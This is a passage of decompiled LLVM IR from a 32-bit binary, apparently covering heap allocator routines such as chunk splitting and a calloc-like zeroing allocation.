  store i32 %v2_8053217, i32* @global_var_8056f88.219, align 8
  br i1 %v2_805307e, label %dec_label_pc_805326f, label %dec_label_pc_8053221

dec_label_pc_8053221:                             ; preds = %dec_label_pc_8053206
  %v1_8053221 = add i32 %v1_805307e, -12
  store i32 %v0_805306b, i32* %ecx.global-to-local, align 4
  %v1_8053228 = and i32 %v1_8053221, -8
  store i32 %v1_8053228, i32* %eax.global-to-local, align 4
  %v1_805322d = or i32 %v1_8053228, 1
  store i32 %v1_805322d, i32* @edx, align 4
  %v5_8053230 = icmp ult i32 %v1_8053228, 15
  store i32 %v1_805322d, i32* %v2_8053074, align 4
  %v0_8053236 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053236 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053236 = add i32 %v0_8053236, 4
  %v3_8053236 = add i32 %v2_8053236, %v1_8053236
  %v4_8053236 = inttoptr i32 %v3_8053236 to i32*
  store i32 5, i32* %v4_8053236, align 4
  %v0_805323e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805323e = load i32, i32* %eax.global-to-local, align 4
  %v2_805323e = add i32 %v0_805323e, 8
  %v3_805323e = add i32 %v2_805323e, %v1_805323e
  %v4_805323e = inttoptr i32 %v3_805323e to i32*
  store i32 5, i32* %v4_805323e, align 4
  br i1 %v5_8053230, label %dec_label_pc_805326f, label %dec_label_pc_8053248

dec_label_pc_8053248:                             ; preds = %dec_label_pc_8053221
  %v0_805324b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805324d = add i32 %v0_805324b, 8
  store i32 %v1_805324d, i32* %eax.global-to-local, align 4
  %v0_8053250 = load i32, i32* @global_var_8056f64.223, align 4
  store i32 %v0_8053250, i32* @ebx, align 4
  store i32 %v1_805324d, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8056f64.223, align 4
  %v1_8053261 = call i32 @function_8053999(i32 %v1_805324d)
  store i32 %v1_8053261, i32* %eax.global-to-local, align 4
  %v0_8053266 = load i32, i32* @ebx, align 4
  store i32 %v0_8053266, i32* @global_var_8056f64.223, align 4
  br label %dec_label_pc_805326f

dec_label_pc_805326f:                             ; preds = %dec_label_pc_8053221, %dec_label_pc_8053206, %dec_label_pc_8053201, %dec_label_pc_8053130, %dec_label_pc_8053248
  %v0_805326f = load i32, i32* @global_var_8056f88.219, align 8
  store i32 %v0_805326f, i32* %eax.global-to-local, align 4
  %v1_8053274 = load i32, i32* @global_var_8056f8c.224, align 4
  %tmp133 = icmp ugt i32 %v0_805326f, %v1_8053274
  br i1 %tmp133, label %dec_label_pc_805327c, label %dec_label_pc_8053281

dec_label_pc_805327c:                             ; preds = %dec_label_pc_805326f
  store i32 %v0_805326f, i32* @global_var_8056f8c.224, align 4
  br label %dec_label_pc_8053281

dec_label_pc_8053281:                             ; preds = %dec_label_pc_805326f, %dec_label_pc_805327c
  %v1_8053281 = load i32, i32* @global_var_8056f84.217, align 4
  %v2_8053281 = add i32 %v1_8053281, %v0_805326f
  store i32 %v2_8053281, i32* %eax.global-to-local, align 4
  %v1_8053287 = load i32, i32* @global_var_8056f94.220, align 4
  %tmp134 = icmp ugt i32 %v2_8053281, %v1_8053287
  br i1 %tmp134, label %dec_label_pc_805328f, label %dec_label_pc_8053294

dec_label_pc_805328f:                             ; preds = %dec_label_pc_8053281
  store i32 %v2_8053281, i32* @global_var_8056f94.220, align 4
  br label %dec_label_pc_8053294

dec_label_pc_8053294:                             ; preds = %dec_label_pc_8053281, %dec_label_pc_805328f
  %v0_8053294 = load i32, i32* @global_var_8056c4c.207, align 4
  store i32 %v0_8053294, i32* @ebx, align 4
  %v1_805329a = add i32 %v0_8053294, 4
  %v2_805329a = inttoptr i32 %v1_805329a to i32*
  %v3_805329a = load i32, i32* %v2_805329a, align 4
  %v1_805329d = and i32 %v3_805329a, -4
  store i32 %v1_805329d, i32* %ecx.global-to-local, align 4
  %v10_80532a0 = icmp ult i32 %v1_805329d, %v1_8052f3d
  br i1 %v10_80532a0, label %dec_label_pc_8053320, label %dec_label_pc_80532a6

dec_label_pc_80532a6:                             ; preds = %dec_label_pc_8053294
  store i32 %v1_8052fc8, i32* %esi.global-to-local, align 4
  %v2_80532ac = sub i32 %v1_805329d, %v1_8052fc8
  store i32 %v2_80532ac, i32* %ecx.global-to-local, align 4
  %v2_80532ae = add i32 %v0_8053294, %v1_8052fc8
  store i32 %v2_80532ae, i32* @edx, align 4
  %v1_80532b1 = or i32 %v1_8052fc8, 1
  store i32 %v1_80532b1, i32* %eax.global-to-local, align 4
  store i32 %v2_80532ae, i32* @global_var_8056c4c.207, align 4
  store i32 %v1_80532b1, i32* %v2_805329a, align 4
  %v0_80532bd.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80532bd

dec_label_pc_80532bd:                             ; preds = %dec_label_pc_8052f4e, %dec_label_pc_80532a6
  %v0_80532bd = phi i32 [ %v5_8052f61, %dec_label_pc_8052f4e ], [ %v0_80532bd.pre, %dec_label_pc_80532a6 ]
  %v1_80532bd = or i32 %v0_80532bd, 1
  store i32 %v1_80532bd, i32* %ecx.global-to-local, align 4
  %v0_80532c0 = load i32, i32* @ebx, align 4
  %v1_80532c0 = add i32 %v0_80532c0, 8
  store i32 %v1_80532c0, i32* %ebx.global-to-local, align 4
  %v1_80532c3 = load i32, i32* @edx, align 4
  %v2_80532c3 = add i32 %v1_80532c3, 4
  %v3_80532c3 = inttoptr i32 %v2_80532c3 to i32*
  store i32 %v1_80532bd, i32* %v3_80532c3, align 4
  br label %dec_label_pc_805332d

dec_label_pc_80532c8:                             ; preds = %dec_label_pc_8052d08
  %v5_80532ce = sub i32 %v1_8052ceb, %v1_8052fc8
  store i32 %v5_80532ce, i32* %eax.global-to-local, align 4
  %v2_80532d2 = add i32 %v1_80532df, %v1_8052fc8
  store i32 %v2_80532d2, i32* @edx, align 4
  %v1_80532d6 = or i32 %v1_8052fc8, 1
  store i32 %v2_80532d2, i32* @global_var_8056c50.208, align 16
  store i32 %v1_80532d6, i32* %v2_8052ce5, align 4
  %v0_80532e2 = load i32, i32* %eax.global-to-local, align 4
  %v0_80532e4 = load i32, i32* @edx, align 4
  store i32 %v0_80532e4, i32* @global_var_8056c5c.225, align 4
  %v1_80532ea = or i32 %v0_80532e2, 1
  store i32 %v1_80532ea, i32* %ecx.global-to-local, align 4
  store i32 %v0_80532e4, i32* @global_var_8056c60.210, align 32
  %v1_80532f3 = add i32 %v0_80532e4, 8
  %v2_80532f3 = inttoptr i32 %v1_80532f3 to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_80532f3, align 4
  %v0_80532fa = load i32, i32* @edx, align 4
  %v1_80532fa = add i32 %v0_80532fa, 12
  %v2_80532fa = inttoptr i32 %v1_80532fa to i32*
  store i32 ptrtoint (i32* @global_var_8056c54.209 to i32), i32* %v2_80532fa, align 4
  %v0_8053301 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053301 = load i32, i32* @edx, align 4
  %v2_8053301 = add i32 %v1_8053301, 4
  %v3_8053301 = inttoptr i32 %v2_8053301 to i32*
  store i32 %v0_8053301, i32* %v3_8053301, align 4
  %v0_8053304 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053304 = load i32, i32* @edx, align 4
  %v3_8053304 = add i32 %v1_8053304, %v0_8053304
  %v4_8053304 = inttoptr i32 %v3_8053304 to i32*
  store i32 %v0_8053304, i32* %v4_8053304, align 4
  br label %dec_label_pc_8053312

dec_label_pc_8053309:                             ; preds = %dec_label_pc_8052d17
  store i32 %v1_8052fc8, i32* %ebx.global-to-local, align 4
  %v0_805330d = load i32, i32* @ebp, align 4
  %v2_805330d = or i32 %v1_8052fc8, 4
  %v3_805330d = add i32 %v0_805330d, %v2_805330d
  %v4_805330d = inttoptr i32 %v3_805330d to i32*
  %v5_805330d = load i32, i32* %v4_805330d, align 4
  %v6_805330d = or i32 %v5_805330d, 1
  store i32 %v6_805330d, i32* %v4_805330d, align 4
  br label %dec_label_pc_8053312

dec_label_pc_8053312:                             ; preds = %dec_label_pc_80532c8, %dec_label_pc_8053309
  %v0_8053312 = load i32, i32* @ebp, align 4
  %v1_8053312 = add i32 %v0_8053312, 8
  store i32 %v1_8053312, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805332d

dec_label_pc_8053317:                             ; preds = %dec_label_pc_8052e07
  %v1_8053317 = load i32, i32* @ebx, align 4
  %v2_8053317 = add i32 %v0_8052e16, 4
  %v3_8053317 = add i32 %v2_8053317, %v1_8053317
  %v4_8053317 = inttoptr i32 %v3_8053317 to i32*
  %v5_8053317 = load i32, i32* %v4_8053317, align 4
  %v6_8053317 = or i32 %v5_8053317, 1
  store i32 %v6_8053317, i32* %v4_8053317, align 4
  br label %dec_label_pc_805331c

dec_label_pc_805331c:                             ; preds = %dec_label_pc_8052e1f, %dec_label_pc_8053317
  %v0_805331c = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_805331c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805332d

dec_label_pc_8053320:                             ; preds = %dec_label_pc_80530de, %dec_label_pc_8053294, %dec_label_pc_80530e8
  %v0_8053320 = load i32, i32* %stack_var_-92, align 4
  %v1_8053320 = call i32 @function_8052779(i32 %v0_8053320)
  store i32 %v1_8053320, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053327 = inttoptr i32 %v1_8053320 to i32*
  store i32 12, i32* %v1_8053327, align 4
  br label %dec_label_pc_805332d

dec_label_pc_805332d:                             ; preds = %dec_label_pc_805331c, %dec_label_pc_8053312, %dec_label_pc_80532bd, %dec_label_pc_8052f79, %dec_label_pc_8052f2b, %dec_label_pc_8052cb2, %dec_label_pc_8053320
  store i32 %v2_8052be9, i32* @eax, align 4
  store i32 %v2_8052be9, i32* %stack_var_-92, align 4
  %v2_8053336 = call i32 @function_8054100(i32 %v2_8052be9, i32 1)
  store i32 %v2_8053336, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805333e

dec_label_pc_805333e:                             ; preds = %dec_label_pc_8052c07, %dec_label_pc_805332d
  %v0_8053341 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053341, i32* %eax.global-to-local, align 4
  store i32 %v0_8052bd6, i32* @esi, align 4
  store i32 %v0_8052bd5, i32* @edi, align 4
  store i32 %v0_8052bd4, i32* @ebp, align 4
  ret i32 %v0_8053341

; uselistorder directives
  uselistorder i32 %v0_8053304, { 1, 0 }
  uselistorder i32 %v0_80532e4, { 1, 0, 2 }
  uselistorder i32 %v2_8053281, { 1, 0, 2 }
  uselistorder i32 %v0_805326f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8053206, { 1, 0 }
  uselistorder i32 %v2_80531f4, { 1, 0 }
  uselistorder i32 %v1_80531ab, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8053195, { 1, 0, 2 }
  uselistorder i32 %v2_8053189, { 1, 2, 0 }
  uselistorder i32 %v2_8053184, { 1, 0, 2 }
  uselistorder i32 %v1_8053174, { 2, 1, 0 }
  uselistorder i8 %v0_8053142, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8053125, { 1, 0, 2 }
  uselistorder i32 %v0_80531d993, { 2, 0, 1 }
  uselistorder i32 %v0_80531e794, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_805311f, { 2, 1, 0 }
  uselistorder i32 %v8_80530f5, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_80530f2, { 1, 0 }
  uselistorder i32 %v0_80530d1, { 1, 0 }
  uselistorder i32 %v2_80530a2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805309a, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8053087, { 1, 0 }
  uselistorder i1 %v2_805307e, { 2, 1, 0 }
  uselistorder i32 %v1_805307e, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_805306b, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_805304f, { 1, 0, 2 }
  uselistorder i32 %v2_805303b, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_8053004, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052ff8, { 2, 1, 0 }
  uselistorder i32 %v8_8052fe7, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_8052fce, { 1, 0, 2 }
  uselistorder i32 %v0_8052f6a, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052f3d, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052f33, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052f25, { 1, 0 }
  uselistorder i32 %v1_8052ebc, { 1, 0 }
  uselistorder i32 %v3_8052eb0, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_8052ec0, { 1, 0 }
  uselistorder i32 %v2_8052eaa, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052ea77, { 1, 0 }
  uselistorder i32 %v2_8052e9c, { 1, 0 }
  uselistorder i32 %v1_8052e80, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052e7c, { 2, 1, 0 }
  uselistorder i32 %v1_8052e78, { 1, 0 }
  uselistorder i32 %v1_8052e6c, { 2, 1, 0 }
  uselistorder i32 %v2_8052e62, { 1, 0 }
  uselistorder i32 %v1_8052e5f, { 1, 2, 0 }
  uselistorder i32 %v4_8052dfd, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_8052e48, { 1, 0 }
  uselistorder i32 %v0_8052e16, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052de9, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052db6, { 0, 2, 1 }
  uselistorder i32 %v2_8052d9a, { 1, 0 }
  uselistorder i32 %v1_8052d90, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_8052d8b.lcssa, { 1, 0 }
  uselistorder i32 %v3_8052d7b, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052d72, { 1, 0, 2 }
  uselistorder i32 %v2_8052d4e, { 2, 0, 1, 3 }
  uselistorder i32 %v2_8052d36, { 2, 1, 0 }
  uselistorder i32 %v0_8052d22, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8052ce8, { 1, 0, 2 }
  uselistorder i32 %v1_80532df, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8052db69, { 1, 0, 2 }
  uselistorder i32 %v3_8052c95, { 1, 0, 2 }
  uselistorder i32 %v2_8052c87, { 2, 1, 0 }
  uselistorder i32 %v2_8052c62, { 2, 1, 0 }
  uselistorder i8 %v0_8052c30, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_8052fc8, { 13, 31, 12, 2, 29, 11, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_8052c19, { 0, 2, 1 }
  uselistorder i32 %v0_8052c02, { 1, 0 }
  uselistorder i32 %v2_8052be9, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ecx.global-to-local, { 23, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32* %ebx.global-to-local, { 21, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 0, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8056f80.222, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @function_8054418, { 1, 0 }
  uselistorder i32 134573140, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_8056c60.210, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_8052bae, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_8056c4c.207 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8056c4c.207 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_805333e, { 1, 0 }
  uselistorder label %dec_label_pc_805332d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8053320, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805331c, { 1, 0 }
  uselistorder label %dec_label_pc_8053312, { 1, 0 }
  uselistorder label %dec_label_pc_80532bd, { 1, 0 }
  uselistorder label %dec_label_pc_8053294, { 1, 0 }
  uselistorder label %dec_label_pc_8053281, { 1, 0 }
  uselistorder label %dec_label_pc_805326f, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053201, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80531fc, { 1, 0 }
  uselistorder label %dec_label_pc_80531e0, { 1, 0 }
  uselistorder label %dec_label_pc_8053189, { 1, 0 }
  uselistorder label %dec_label_pc_8053172, { 1, 0 }
  uselistorder label %dec_label_pc_805315b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80530de, { 1, 0 }
  uselistorder label %dec_label_pc_80530d1, { 1, 0 }
  uselistorder label %dec_label_pc_8053092, { 1, 0 }
  uselistorder label %dec_label_pc_805306b, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805304f, { 1, 0 }
  uselistorder label %dec_label_pc_8053036, { 1, 0 }
  uselistorder label %dec_label_pc_8053018, { 1, 0 }
  uselistorder label %dec_label_pc_8052f33, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052f2b, { 1, 0 }
  uselistorder label %dec_label_pc_8052f14, { 1, 0 }
  uselistorder label %dec_label_pc_8052ea7, { 1, 0 }
  uselistorder label %dec_label_pc_8052eac.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052e80, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052e07, { 1, 0 }
  uselistorder label %dec_label_pc_8052db6, { 1, 0 }
  uselistorder label %dec_label_pc_8052d8e, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052d77, { 1, 0 }
  uselistorder label %dec_label_pc_8052ce5, { 1, 0 }
  uselistorder label %dec_label_pc_8052db6.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052cb2, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8052c30, { 1, 0 }
}

define i32 @function_8053348(i64 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8053348:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8053348 = load i32, i32* @edi, align 4
  %v0_805334a = load i32, i32* @ebx, align 4
  %v12_805334b = ptrtoint i32* %stack_var_-28 to i32
  %v4_805334e = trunc i64 %arg1 to i32
  store i32 %v4_805334e, i32* @edx, align 4
  %sext = mul i64 %arg1, 4294967296
  %v2_8053358 = sdiv i64 %sext, 4294967296
  %v3_8053358 = sext i32 %arg2 to i64
  %v4_8053358 = mul nsw i64 %v3_8053358, %v2_8053358
  %v5_8053358 = trunc i64 %v4_8053358 to i32
  store i32 %v5_8053358, i32* @ebx, align 4
  %v2_805335b = icmp eq i32 %v4_805334e, 0
  br i1 %v2_805335b, label %dec_label_pc_805337d, label %dec_label_pc_805335f

dec_label_pc_805335f:                             ; preds = %dec_label_pc_8053348
  store i32 %v4_805334e, i32* @edi, align 4
  %div = udiv i32 %v5_8053358, %v4_805334e
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp14 = urem i32 %v5_8053358, %v4_805334e
  store i32 %tmp14, i32* @edx, align 4
  %v12_8053367 = icmp eq i32 %div, %arg2
  br i1 %v12_8053367, label %dec_label_pc_805337d, label %dec_label_pc_805336b

dec_label_pc_805336b:                             ; preds = %dec_label_pc_805335f
  %v1_805336b = call i32 @function_8052779(i32 %v0_805334a)
  store i32 %v1_805336b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8053372 = inttoptr i32 %v1_805336b to i32*
  store i32 12, i32* %v1_8053372, align 4
  br label %dec_label_pc_8053433

dec_label_pc_805337d:                             ; preds = %dec_label_pc_805335f, %dec_label_pc_8053348
  store i32 %v12_805334b, i32* @eax, align 4
  %v2_805338d = call i32 @function_8054100(i32 %v12_805334b, i32 134562045)
  store i32 %v2_805338d, i32* %eax.global-to-local, align 4
  %v1_8053399 = call i32 @function_80540fd(i32 ptrtoint (i32* @global_var_8056880.205 to i32))
  store i32 %v1_8053399, i32* %eax.global-to-local, align 4
  %v0_805339e = load i32, i32* @ebx, align 4
  %v1_80533a1 = call i32 @function_8052bd4(i32 %v0_805339e)
  store i32 %v1_80533a1, i32* %eax.global-to-local, align 4
  store i32 %v1_80533a1, i32* %ebx.global-to-local, align 4
  %v1_80533ab = icmp eq i32 %v1_80533a1, 0
  br i1 %v1_80533ab, label %dec_label_pc_8053422, label %dec_label_pc_80533af

dec_label_pc_80533af:                             ; preds = %dec_label_pc_805337d
  %v1_80533af = add i32 %v1_80533a1, -4
  %v2_80533af = inttoptr i32 %v1_80533af to i32*
  %v3_80533af = load i32, i32* %v2_80533af, align 4
  store i32 %v3_80533af, i32* %eax.global-to-local, align 4
  %v2_80533b2 = and i32 %v3_80533af, 2
  %v3_80533b2 = icmp eq i32 %v2_80533b2, 0
  %v1_80533b4 = icmp eq i1 %v3_80533b2, false
  br i1 %v1_80533b4, label %dec_label_pc_8053422, label %dec_label_pc_80533b6

dec_label_pc_80533b6:                             ; preds = %dec_label_pc_80533af
  %v1_80533b63 = add i32 %v3_80533af, -4
  %v1_80533b9 = and i32 %v1_80533b63, -4
  store i32 %v1_80533b9, i32* @edx, align 4
  %v2_80533be = udiv i32 %v1_80533b9, 4
  store i32 %v2_80533be, i32* %eax.global-to-local, align 4
  %v5_80533c1 = icmp ult i32 %v1_80533b9, 36
  %tmp = and i32 %v1_80533b63, -4
  %tmp18 = icmp eq i32 %tmp, 36
  %v2_80533c4 = or i1 %v5_80533c1, %tmp18
  br i1 %v2_80533c4, label %dec_label_pc_80533d5, label %dec_label_pc_80533c6

dec_label_pc_80533c6:                             ; preds = %dec_label_pc_80533b6
  %v3_80533cb = inttoptr i32 %v1_80533a1 to i8*
  %v4_80533cb = call i32 @function_80527ca(i8* %v3_80533cb, i32 0, i32 %v1_80533b9)
  store i32 %v4_80533cb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053422

dec_label_pc_80533d5:                             ; preds = %dec_label_pc_80533b6
  %v1_80533d5 = inttoptr i32 %v1_80533a1 to i32*
  store i32 0, i32* %v1_80533d5, align 4
  %v0_80533db = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533db = add i32 %v0_80533db, 4
  %v2_80533db = inttoptr i32 %v1_80533db to i32*
  store i32 0, i32* %v2_80533db, align 4
  %v0_80533e2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533e2 = add i32 %v0_80533e2, 8
  %v2_80533e2 = inttoptr i32 %v1_80533e2 to i32*
  store i32 0, i32* %v2_80533e2, align 4
  %v0_80533e9 = load i32, i32* %eax.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_80533e9, 5
  br i1 %tmp15, label %dec_label_pc_8053422, label %dec_label_pc_80533ee

dec_label_pc_80533ee:                             ; preds = %dec_label_pc_80533d5
  %v0_80533ee = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533ee = add i32 %v0_80533ee, 12
  %v2_80533ee = inttoptr i32 %v1_80533ee to i32*
  store i32 0, i32* %v2_80533ee, align 4
  %v0_80533f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80533f5 = add i32 %v0_80533f5, 16
  %v2_80533f5 = inttoptr i32 %v1_80533f5 to i32*
  store i32 0, i32* %v2_80533f5, align 4
  %v0_80533fc = load i32, i32* %eax.global-to-local, align 4
  %tmp16 = icmp ult i32 %v0_80533fc, 7
  br i1 %tmp16, label %dec_label_pc_8053422, label %dec_label_pc_8053401

dec_label_pc_8053401:                             ; preds = %dec_label_pc_80533ee
  %v0_8053401 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053401 = add i32 %v0_8053401, 20
  %v2_8053401 = inttoptr i32 %v1_8053401 to i32*
  store i32 0, i32* %v2_8053401, align 4
  %v0_8053408 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053408 = add i32 %v0_8053408, 24
  %v2_8053408 = inttoptr i32 %v1_8053408 to i32*
  store i32 0, i32* %v2_8053408, align 4
  %v0_805340f = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_805340f, 9
  br i1 %tmp17, label %dec_label_pc_8053422, label %dec_label_pc_8053414

dec_label_pc_8053414:                             ; preds = %dec_label_pc_8053401
  %v0_8053414 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8053414 = add i32 %v0_8053414, 28
  %v2_8053414 = inttoptr i32 %v1_8053414 to i32*
  store i32 0, i32* %v2_8053414, align 4
  %v0_805341b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805341b = add i32 %v0_805341b, 32
  %v2_805341b = inttoptr i32 %v1_805341b to i32*
  store i32 0, i32* %v2_805341b, align 4
  br label %dec_label_pc_8053422

dec_label_pc_8053422:                             ; preds = %dec_label_pc_8053401, %dec_label_pc_80533ee, %dec_label_pc_80533d5, %dec_label_pc_80533af, %dec_label_pc_805337d, %dec_label_pc_80533c6, %dec_label_pc_8053414
  store i32 %v12_805334b, i32* @eax, align 4
  %v2_805342b = call i32 @function_8054100(i32 %v12_805334b, i32 1)
  store i32 %v2_805342b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053433

dec_label_pc_8053433:                             ; preds = %dec_label_pc_805336b, %dec_label_pc_8053422
  %v0_8053436 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053436, i32* %eax.global-to-local, align 4
  store i32 %v0_805334a, i32* @ebx, align 4
  store i32 %v0_8053348, i32* @edi, align 4
  ret i32 %v0_8053436

; uselistorder directives
  uselistorder i32 %v1_80533b9, { 3, 2, 0, 1 }
  uselistorder i32 %v1_80533a1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v5_8053358, { 1, 0, 2 }
  uselistorder i32 %v4_805334e, { 1, 0, 2, 3, 4 }
  uselistorder i32* %ebx.global-to-local, { 9, 0, 3, 1, 6, 2, 7, 4, 5, 8, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 4, 5, 2, 6, 7, 9, 10, 11, 8, 12 }
  uselistorder i64 4294967296, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_8053433, { 1, 0 }
  uselistorder label %dec_label_pc_8053422, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @function_805343c() local_unnamed_addr {
dec_label_pc_805343c:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_805343c = load i32, i32* @ebp, align 4
  %v0_805343d = load i32, i32* @edi, align 4
  %v0_805343e = load i32, i32* @esi, align 4
  %v0_805343f = load i32, i32* @ebx, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v4_8053447 = icmp eq i32 %tmp6, 0
  %v1_805344c = icmp eq i1 %v4_8053447, false
  br i1 %v1_805344c, label %dec_label_pc_805345e, label %dec_label_pc_805344e

dec_label_pc_805344e:                             ; preds = %dec_label_pc_805343c
  store i32 %tmp7, i32* %stack_var_-60, align 4
  %v1_8053452 = call i32 @function_8052bd4(i32 %tmp7)
  store i32 %v1_8053452, i32* %eax.global-to-local, align 4
  store i32 %v1_8053452, i32* @ebx, align 4
  br label %dec_label_pc_8053757

dec_label_pc_805345e:                             ; preds = %dec_label_pc_805343c
  %v1_805345e = icmp eq i32 %tmp7, 0
  %v1_8053460 = icmp eq i1 %v1_805345e, false
  br i1 %v1_8053460, label %dec_label_pc_8053473, label %dec_label_pc_8053462

dec_label_pc_8053462:                             ; preds = %dec_label_pc_805345e
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053469 = call i32 @function_8053999(i32 %tmp6)
  store i32 %v1_8053469, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053757

dec_label_pc_8053473:                             ; preds = %dec_label_pc_805345e
  %v2_805347e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805347e, i32* @eax, align 4
  store i32 %v2_805347e, i32* %stack_var_-60, align 4
  %v2_8053483 = call i32 @function_8054100(i32 %v2_805347e, i32 134562045)
